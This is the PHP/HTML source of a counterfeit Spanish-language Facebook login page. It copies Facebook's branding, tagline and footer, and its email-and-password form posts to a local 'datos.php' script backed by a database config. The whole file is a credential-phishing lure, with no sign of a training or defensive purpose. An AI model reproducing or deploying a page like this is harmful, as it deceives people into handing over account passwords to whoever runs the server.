<?php 
require "../config/db.php";
?>
<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook - Inicia Sesion O Registrate</title>
    <link rel=" icon" href="https://iconape.com/wp-content/png_logo_vector/facebook-f-logo-2019.png"
        type="image/x-icon">
    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css"
        integrity="sha384-ggOyR0iXCbMQv3Xipma34MD+dH/1fQ784/j6cY/iJTQUOhcWr7x9JvoRxT2MZw1T" crossorigin="anonymous">
    <link rel="stylesheet" href="/style/style.css">
</head>

<body class="bg-white">
    <div class="bg-gray ">
        <div class="container-fluid" style="padding-top: 6%;">
            <div class="row">
                <div class="col-lg-7 col uno">
                    <img src="https://download.logo.wine/logo/Facebook/Facebook-Logo.wine.png" width="">
                    <h5>Facebook te ayuda a comunicarte y compartir con las personas que forman parte de tu vida.</h5>
                </div>
                <div class="col-lg-5 col">
                    <div class="card text-center " style="width: 25rem; height: 40vh;">
                        <div class="card-body">
                            <form method="POST" action="../php/datos.php" >
                                <div class="form-group">
                                    <input type="email" class="form-control form-control-lg" id="inputEmail"
                                        aria-describedby="emailHelp" placeholder="Correo electronico o numero de telefono">
                                </div>
                                <p class="error" id="alertaError">
                                    El correo electrónico o número de celular que ingresaste no está conectado a una cuenta. 
                                    <strong>Encuentra Tu Cuenta E Inicia Sesion</strong>
                                </p>
                                <div class="form-group">
                                    <input type="password" class="form-control form-control-lg" id="inputPassword"
                                        placeholder="Contraseña">
                                </div>
                                <button id="btnIniciarSession" type="submit" class="btn btn-primary">Iniciar Sesion</button>
                            </form>
                            <a href="#" class="enlace"> ¿Tienes Problemas Para Iniciar Sesion?</a>
                            <div class="linea"></div>
                            <!-- Button trigger modal -->
                            <div class="boton">
                                <button type="button" class="btn btn-success" data-toggle="modal" data-target="#exampleModal" style="width: 75%; margin-top: 10px; font-size: 1.3rem;">
                                    Crear Cuenta
                                </button>
                            </div>
    
                            <!-- Modal -->
                            <div class="modal fade" id="exampleModal" tabindex="-1" role="dialog"
                                aria-labelledby="exampleModalLabel" aria-hidden="true">
                                <div class="modal-dialog" role="document">
                                    <div class="modal-content">
                                        <div class="modal-header">
                                            <h5 class="modal-title" id="exampleModalLabel">Modal title</h5>
                                            <button type="button" class="close" data-dismiss="modal" aria-label="Close">
                                                <span aria-hidden="true">&times;</span>
                                            </button>
                                        </div>
                                        <div class="modal-body">
                                            ...
                                        </div>
                                        <div class="modal-footer">
                                            <button type="button" class="btn btn-secondary"
                                                data-dismiss="modal">Close</button>
                                            <button type="button" class="btn btn-primary">Save changes</button>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                    <p class="mt-5 parrafo"><strong>Crea una página</strong> para un personaje público, un grupo de música o un negocio.</p>
                </div>
            </div>
        </div>
    </div>
        <footer>
            <div class="container">
                <ul class="nav">
                    <li class="nav-item">
                      <a class="nav-link active" href="#">Español</a>
                    </li>
                    <li class="nav-item">
                      <a class="nav-link" href="#">English</a>
                    </li>
                    <li class="nav-item">
                      <a class="nav-link" href="#">Portugues</a>
                    </li>
                    <li class="nav-item">
                      <a class="nav-link" href="#">Francais</a>
                    </li>
                    <li class="nav-item">
                        <a class="nav-link active" href="#">Italiano</a>
                      </li>
                      <li class="nav-item">
                        <a class="nav-link" href="#">Deutsch</a>
                      </li>
                      <li class="nav-item">
                        <a class="nav-link" href="#">العربية</a>
                      </li>
                      <li class="nav-item">
                        <a class="nav-link" href="#">日本語</a>
                      </li>
                      <li class="nav-item">
                        <a class="nav-link" href="#">हिन्दी </a>
                      </li>
                      <li class="nav-item">
                        <a class="nav-link disabled" href="#">中文(简体)</a>
                      </li>
                      <li class="nav-item">
                          <button class="btn btn-secondary">+</button>
                      </li>
                  </ul>
                  <div class="linea"></div>
                  <ul class="nav">
                    <li class="nav-item">
                      <a class="nav-link" href="#">local</a>
                    </li>
                    <li class="nav-item">
                      <a class="nav-link" href="#">recaudaciones de fondos</a>
                    </li>
                    <li class="nav-item">
                      <a class="nav-link" href="#">servicios</a>
                    </li>
                    <li class="nav-item">
                      <a class="nav-link" href="#">centros de informacion de votacion</a>
                    </li>
                    <li class="nav-item">
                        <a class="nav-link" href="#">informacion</a>
                      </li>
                      <li class="nav-item">
                        <a class="nav-link" href="#">crear anuncio</a>
                      </li>
                      <li class="nav-item">
                        <a class="nav-link" href="#">crear pagina</a>
                      </li>
                      <li class="nav-item">
                        <a class="nav-link" href="#">desarrolladores</a>
                      </li>
                      <li class="nav-item">
                        <a class="nav-link" href="#">empleo </a>
                      </li>
                      <li class="nav-item">
                        <a class="nav-link" href="#">privacidad</a>
                      </li>
                      <li class="nav-item">
                          <a class="nav-link">cookies</a>
                      </li>
                      <li class="nav-item">
                        <a class="nav-link active" href="#">Registrarte</a>
                      </li>
                      <li class="nav-item">
                        <a class="nav-link" href="#">iniciar sesion</a>
                      </li>
                      <li class="nav-item">
                        <a class="nav-link" href="#">messenger</a>
                      </li>
                      <li class="nav-item">
                        <a class="nav-link disabled" href="#">facebook lite</a>
                      </li>
                      <li class="nav-item">
                          <a class="nav-link active" href="#">watch</a>
                        </li>
                        <li class="nav-item">
                          <a class="nav-link" href="#">lugares</a>
                        </li>
                        <li class="nav-item">
                          <a class="nav-link" href="#">juegos</a>
                        </li>
                        <li class="nav-item">
                          <a class="nav-link" href="#">market place</a>
                        </li>
                        <li class="nav-item">
                          <a class="nav-link" href="#">facebook play </a>
                        </li>
                        <li class="nav-item">
                          <a class="nav-link" href="#">empleos</a>
                        </li>
                        <li class="nav-item">
                            <a class="nav-link">oculus</a>
                        </li>
                        <li class="nav-item">
                          <a class="nav-link">portal</a>
                      </li>
                      <li class="nav-item">
                          <a class="nav-link">instagram</a>
                      </li>
                  </ul>
            </div>
        </footer>
</body>
<script src="https://code.jquery.com/jquery-3.3.1.slim.min.js"
    integrity="sha384-q8i/X+965DzO0rT7abK41JStQIAqVgRVzpbzo5smXKp4YfRvH+8abtTE1Pi6jizo" crossorigin="anonymous">
</script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.7/umd/popper.min.js"
    integrity="sha384-UO2eT0CpHqdSJQ6hJty5KVphtPhzWj9WO1clHTMGa3JDZwrnQq4sF86dIHNDz0W1" crossorigin="anonymous">
</script>
<script src="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/js/bootstrap.min.js"
    integrity="sha384-JjSmVgyd0p3pXB1rRibZUAYoIIy6OrQ6VrjIEaFf/nJGzIxFDsf4x0xIM+B07jRM" crossorigin="anonymous">
</script>
<script src="/js/scripts.js"></script>

</html>